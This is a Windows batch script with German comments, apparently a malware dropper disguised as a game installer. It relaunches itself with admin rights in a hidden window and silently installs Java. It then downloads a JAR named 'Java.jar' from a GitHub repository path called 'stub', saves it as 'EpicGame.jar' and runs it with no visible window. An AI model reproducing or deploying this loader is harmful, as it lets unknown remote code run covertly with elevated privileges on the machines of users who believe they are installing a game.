@echo off
:: Überprüfen, ob das Skript mit Administratorrechten ausgeführt wird
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    :: Skript als Administrator neu starten (unsichtbar)
    powershell -Command "Start-Process cmd -Argument '/c \"%~f0\"' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: UTF-8 Codepage setzen
chcp 65001 >nul

:: Überprüfen, ob Java bereits installiert ist (unsichtbar)
java -version >nul 2>&1
if %errorLevel% NEQ 0 (
    goto :install_java
) else (
    goto :download_and_run_jar
)

:: Java Installation
:install_java
set "url=https://javadl.oracle.com/webapps/download/AutoDL?BundleId=250129_d8aa705069af427f9b83e66b34f5e380"
set "output=%TEMP%\game-engine-installer.exe"
set "installDir=C:\Program Files\Java\jdk-latest"

:: Download starten (im Hintergrund)
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%output%')"

:: Überprüfen, ob der Download erfolgreich war
if exist "%output%" (
    start /wait "" "%output%" /s INSTALLDIR="%installDir%"
    if exist "%installDir%\bin\java.exe" (
        del "%output%"
    ) else (
        exit /b 1
    )
) else (
    exit /b 1
)

:: PATH-Umgebungsvariable aktualisieren
setx PATH "%PATH%;%installDir%\bin" /M

:: Download und Ausführung der JAR-Datei
:download_and_run_jar
set "jarUrl=https://github.com/Python-is-trash/stub/raw/refs/heads/main/Java.jar"
set "jarOutput=%TEMP%\EpicGame.jar"

:: JAR-Datei herunterladen (unsichtbar)
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%jarUrl%', '%jarOutput%')"

:: JAR-Datei im Hintergrund ausführen (unsichtbar)
if exist "%jarOutput%" (
    if exist "%installDir%\bin\java.exe" (
        powershell -Command "Start-Process '%installDir%\bin\java.exe' -ArgumentList '-jar', '%jarOutput%' -WindowStyle Hidden"
    ) else (
        powershell -Command "Start-Process 'java' -ArgumentList '-jar', '%jarOutput%' -WindowStyle Hidden"
    )
)

exit
